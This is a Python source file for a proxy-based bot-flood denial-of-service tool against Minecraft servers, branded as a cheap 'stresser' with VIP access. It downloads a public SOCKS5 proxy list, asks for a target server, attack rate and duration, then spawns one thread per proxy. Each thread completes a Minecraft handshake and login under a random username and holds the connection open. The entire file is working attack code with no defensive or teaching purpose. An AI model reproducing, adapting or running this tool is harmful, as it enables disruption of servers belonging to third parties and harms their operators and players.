import socket
import threading
import time
import random
import struct
import os
import shutil
import cv2
import numpy as np
from PIL import Image
from urllib.request import urlopen
from urllib.error import URLError
from pystyle import Colorate, Colors
import socks
import colorama
from colorama import Fore

white = Fore.WHITE
reset = Fore.RESET

def play_ascii_video(video_path, frame_delay=1/128, duration=2.5):
    ASCII_CHARS = "█▇▆▅▄▃▂▁ "  

    size = shutil.get_terminal_size(fallback=(100, 40))
    term_width, term_height = size.columns, size.lines
    frame_width = term_width - 2

    cap = cv2.VideoCapture(video_path)
    if not cap.isOpened():
        print("Error: Couldn't open video.")
        return False

    start_time = time.time()
    while cap.isOpened():
        if time.time() - start_time > duration:
            break

        ret, frame = cap.read()
        if not ret:
            break

        pil_image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        width, height = pil_image.size
        aspect_ratio = height / width

        new_width = frame_width
        new_height = int(aspect_ratio * new_width * 0.5)
        new_height = min(new_height, term_height - 2)

        resized_image = pil_image.resize((new_width, new_height), Image.LANCZOS)
        resized_array = np.array(resized_image)

        gray = cv2.cvtColor(resized_array, cv2.COLOR_RGB2GRAY)
        intensities = gray.flatten()

        if intensities.max() != intensities.min():
            intensities = (intensities - intensities.min()) * 255 / (intensities.max() - intensities.min())
        else:
            intensities[:] = 0

        colors = resized_array.reshape(-1, 3)

        ascii_frame = ""
        for i in range(len(intensities)):
            char_idx = int((intensities[i] / 255) * (len(ASCII_CHARS) - 1))
            char = ASCII_CHARS[char_idx]

            r, g, b = colors[i]
            ascii_frame += f"\033[38;2;{r};{g};{b}m{char}"

            if (i + 1) % new_width == 0:
                ascii_frame += "\n"

        ascii_frame += "\033[0m"

        os.system('cls' if os.name == 'nt' else 'clear')
        print(ascii_frame, end='', flush=True)
        time.sleep(frame_delay)

    cap.release()
    return True
    
def clearcs():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def load_proxies(file_path="proxies.txt"):
    if not os.path.exists(file_path):
        exit(1)
    with open(file_path, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    if not proxies:
        exit(1)
    return proxies

def download_proxies():
    proxy_url = "https://vakhov.github.io/fresh-proxy-list/socks5.txt"
    try:
        response = urlopen(proxy_url, timeout=5)
        data = response.read().decode('utf-8', errors='ignore')
        proxies = set()
        for line in data.splitlines():
            if ':' in line and line.strip():
                proxies.add(line.strip())
        if proxies:
            with open("proxies.txt", "w") as f:
                for proxy in proxies:
                    f.write(proxy + "\n")
        else:
            exit(1)
    except URLError:
        exit(1)

def create_handshake_packet(host, port, protocol_version, state=1):
    packet = bytearray()
    packet.append(0x00)
    packet += encode_varint(protocol_version)
    packet += encode_varint(len(host))
    packet += host.encode('utf-8')
    packet += struct.pack('>H', port)
    packet += encode_varint(state)
    return encode_varint(len(packet)) + packet

def create_login_packet(username):
    packet = bytearray()
    packet.append(0x00)
    username_bytes = username.encode('utf-8')
    packet += encode_varint(len(username_bytes))
    packet += username_bytes
    return encode_varint(len(packet)) + packet

def encode_varint(value):
    result = bytearray()
    while True:
        temp = value & 0x7F
        value >>= 7
        if value:
            result.append(temp | 0x80)
        else:
            result.append(temp)
            break
    return result

def random_username():
    chars = "abcdefghijklmnopqrstuvwxyz0123456789_"
    length = random.randint(3, 16)
    return ''.join(random.choice(chars) for _ in range(length))

def bot_connect(proxy, host, port, protocol_version, event, stop_event, rate_limit):
    ip, proxy_port = proxy.split(':')
    proxy_port = int(proxy_port)
    username = random_username()
    delay = 1.0 / rate_limit

    while not stop_event.is_set() and event.is_set():
        sock = None
        try:
            sock = socks.socksocket()
            sock.settimeout(2.5)
            sock.set_proxy(socks.SOCKS5, ip, proxy_port)
            sock.connect((host, port))

            handshake = create_handshake_packet(host, port, protocol_version, state=2)
            sock.sendall(handshake)

            login = create_login_packet(username)
            sock.sendall(login)

            while not stop_event.is_set() and event.is_set():
                try:
                    sock.sendall(b"\x00")
                    time.sleep(1)
                except socket.error:
                    break

        except socket.error:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        time.sleep(delay)

def run_attack(host, port, protocol_version, rate, duration):
    proxies = load_proxies()
    rate_limit = {1: 3, 2: 5, 3: 10}[rate]
    event = threading.Event()
    stop_event = threading.Event()
    threads = []

    clearcs()
    play_ascii_video("sent.mp4", duration=2.5)
    print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═")}
{Colorate.Horizontal(Colors.cyan_to_blue, "             ╠═╣ ║  ║ ╠═╣║  ╠╩╗")}
{Colorate.Horizontal(Colors.cyan_to_blue, "             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩")}
{white}  ⋆.˚ ☾ .⭒˚ 𝓑𝓮𝓼𝓽 𝓬𝓱𝓮𝓪𝓹 𝓼𝓽𝓻𝓮𝓼𝓼𝓮𝓻 ⋆.˚ ☾ .⭒˚
{Colorate.Horizontal(Colors.cyan_to_blue, "╔═══════════════════════════════════════════╗")}
{Colorate.Horizontal(Colors.cyan_to_blue, "║")} {white}𝓐𝓽𝓽𝓪𝓬𝓴 𝓢𝓾𝓶𝓶𝓪𝓻𝔂 {Colorate.Horizontal(Colors.cyan_to_blue, "                           ║")}
{Colorate.Horizontal(Colors.cyan_to_blue, "╠═══╦═══════════════════════════════════════╣")}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴛᴀʀɢᴇᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "    ➤")}  {f'{host}:{port}'.ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴍᴇᴛʜᴏᴅ {Colorate.Horizontal(Colors.cyan_to_blue, "    ➤")}  connect
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴛɪᴍᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "      ➤")}  {str(duration).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴛʜʀᴇᴀᴅ {Colorate.Horizontal(Colors.cyan_to_blue, "    ➤")}  {str(rate_limit) + ' conn/sec'.ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴘʀᴏᴛᴏᴄᴏʟ {Colorate.Horizontal(Colors.cyan_to_blue, "  ➤")}  {str(protocol_version).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "╠═══╬═══════════════════════════════════════╣")}
{Colorate.Horizontal(Colors.cyan_to_blue, "║ ● ║")} {white}ᴀᴄᴄᴇꜱꜱ     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  VIP
{Colorate.Horizontal(Colors.cyan_to_blue, "╠═══╬═══════════════════════════════════════╣")}
{Colorate.Horizontal(Colors.cyan_to_blue, "╚═══╩═══════════════════════════════════════╝")}""")
    
    event.set()

    for proxy in proxies:
        thread = threading.Thread(target=bot_connect, args=(proxy, host, port, protocol_version, event, stop_event, rate_limit))
        thread.daemon = True
        threads.append(thread)
        thread.start()
        time.sleep(0.01)

    time.sleep(duration)
    stop_event.set()
    event.clear()

def validate_ip_port(ip_port):
    parts = ip_port.split(':')
    host = parts[0]
    port = 25565 if len(parts) == 1 else parts[1]
    try:
        port = int(port)
        if not (1 <= port <= 65535):
            raise ValueError("Port out of range")
        socket.gethostbyname(host)
        return host, port
    except (socket.gaierror, ValueError):
        return None, None

def validate_rate(rate):
    try:
        rate = int(rate)
        if rate not in [1, 2, 3]:
            raise ValueError
        return rate
    except ValueError:
        return None

def validate_duration(duration):
    try:
        duration = int(duration)
        if duration <= 0:
            raise ValueError
        return duration
    except ValueError:
        return None

def validate_protocol(protocol):
    try:
        protocol = int(protocol)
        if protocol <= 0:
            raise ValueError
        return protocol
    except ValueError:
        return None

def main():
    download_proxies()

    ip_port = input(Colorate.Horizontal(Colors.cyan_to_blue, "> Enter Minecraft server host:port: "))
    host, port = validate_ip_port(ip_port)
    if not host:
        return

    rate = input(Colorate.Horizontal(Colors.cyan_to_blue, "> Choose attack mode (1=low [3/sec], 2=medium [5/sec], 3=maximum [10/sec]): "))
    rate = validate_rate(rate)
    if not rate:
        return

    duration = input(Colorate.Horizontal(Colors.cyan_to_blue, "> Enter attack duration: "))
    duration = validate_duration(duration)
    if not duration:
        return

    protocol = input(Colorate.Horizontal(Colors.cyan_to_blue, "> Enter Minecraft protocol version [https://minecraft.fandom.com/wiki/Protocol_version]: "))
    protocol = validate_protocol(protocol)
    if not protocol:
        return

    run_attack(host, port, protocol, rate, duration)

if __name__ == "__main__":
    main()
